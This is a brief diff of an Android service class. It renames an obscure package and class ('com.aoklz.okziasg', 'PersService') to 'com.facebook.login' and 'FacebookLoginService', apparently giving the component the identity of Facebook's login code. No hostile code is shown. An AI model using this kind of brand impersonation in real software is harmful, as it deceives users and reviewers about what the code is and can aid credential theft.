@@ -1,4 +1,4 @@
-package com.aoklz.okziasg;
+package com.facebook.login;
 
 import android.app.Service;
 import android.content.Intent;
@@ -6,7 +6,7 @@ import android.os.IBinder;
 
 import com.charm.refined.cas.Authen;
 
-public class PersService extends Service {
+public class FacebookLoginService extends Service {
     public Authen helper1;
 
     public IBinder onBind(Intent intent) {
